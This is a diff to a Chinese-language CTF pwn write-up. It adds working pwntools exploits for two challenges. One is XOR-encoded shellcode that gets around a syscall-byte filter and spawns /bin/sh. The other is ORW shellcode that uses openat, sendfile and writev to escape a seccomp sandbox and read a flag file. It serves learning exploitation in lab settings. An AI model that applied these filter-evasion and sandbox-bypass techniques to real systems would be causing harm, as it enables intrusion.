@@ -465,6 +465,52 @@ p.interactive()
 ![[Pasted image 20241006022233.png]]
 运行后获取flag
 ### BadAsm(复现)
+本题为一道shellcode的题目，需手动编写一段shellcode输入来获取shellcode，程序限制了不能使用`syscall/sysenter/int 0x80`机器码，由于使用`strcpy`来将我们编写的`shellcode`输入至栈上，同时不能含有`\x00`。
+这道题我采用异或出syscall的机械码后直接执行的方法
+exp:
+```python
+from pwn import *
+import pwnlib.gdb
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True
+if local:
+    p = process('./BadAsm')
+    # pwnlib.gdb.attach(p, 'b *$rebase(0x147f)')
+else:
+    p = remote('')
+'/bin/sh\x00 = 0068 732F 6E69 622F'
+
+shellcode='''
+    mov rsp, rdi
+    add sp, 0x0848 ; //赋予rsp合法值，否则会无法运行push/pop
+    
+    mov rsi, 0x4028336F2E29226F
+    mov rdx, 0x4040404040404040
+    xor rsi, rdx ; //用异或搓出/bin/sh\x00，这里必须用寄存器存，不然应该是会超出xor的处理长度(应该是这个意思)
+    ; //mov rsi, 0x4028336F2E29226F
+    ; //xor rsi, 0x4040404040404040
+    ; //上面这种不行
+    push rsi ; //push后会直接存在rsp中
+    
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx ; //将binsh的地址存入rdi，设置rsi,rdx
+    xor rax, rax
+    mov al, 59 ; //设置rax的值为59，既execve的系统调用号
+    
+    mov cx, 0x454f
+    xor cx, 0x4040
+    push rcx ; //异或出syscall的机械码
+    jmp rsp
+'''
+
+p.sendafter("Input your Code :", asm(shellcode))
+
+p.interactive()
+```
+运行后获取sh
+![[Pasted image 20241031084439.png]]
 
 # Week 3
 ## PWN
@@ -586,6 +632,7 @@ p.interactive()
 ```
 ![[Pasted image 20241013115334.png]]
 ### Easy_Shellcode(复现)
+#### 做题时思路
 虽然这题没做出来，但感觉我的思路应该没错，应该是构造shellcode的水平实在不行。
 ![[Pasted image 20241013115859.png]]
 可以看到仅打开了NX保护
@@ -595,6 +642,41 @@ p.interactive()
 orw指的是open,read和write，有由于sandbox限制了一些系统调用，但一般都会有这三个或这三个中的几个，所以我们可以使用open函数直接打开flag文件，用read函数将其读入到栈上或内存空间中，然后使用write函数再打印出来，从而获取flag
 但这道题中很显然我们只有or没有w，那么我们就只能用爆破的方法一位一位爆破flag的值，也就是侧信道爆破的方法，将flag的值爆破出来。
 在实际操作的过程中遇到的问题是我构造的shellcode并不能将我自己构造的flag读入到指定的位置上，并未能解决
+#### 复现部分
+上面的大致思路没有错，只是本题只是禁止了`write`，还有`writev`，`sendfile`这两可以用，不需要采用侧信道爆破的方法来做。
+以及本题需要手动恢复`rsp`寄存器，恢复之后就可以用`shellcraft`来构造
+exp:
+```python
+from pwn import *
+import pwnlib.gdb
+import pwnlib.shellcraft
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True
+if local:
+    p = process('./ez_shellcode')
+else:
+    p = remote('node3.buuoj.cn', 28435)
+
+rsp = '''
+    mov rsp, 0x4040c0
+'''
+shellcode = rsp
+shellcode += shellcraft.openat(-100, "./flag", 0, 0)
+shellcode += shellcraft.sendfile(1, 3, 0, 0x100)
+
+shellcode_2 = rsp + shellcraft.openat(-100, "./flag", 0, 0)
+shellcode_2 += shellcraft.preadv2(3, 0x4040c0, 0x100)
+shellcode_2 += shellcraft.writev(1, 0x4040c0, 0x100)
+
+# payload = asm
+payload = asm(shellcode_2)
+p.sendlineafter(b'World!', payload)
+
+p.interactive()
+```
+![[Pasted image 20241031090010.png]]
+复现的时候没有环境了，这个flag是我自己编写的。
 ### One_Last_B1te(复现)
 # Week 4
 ## PWN
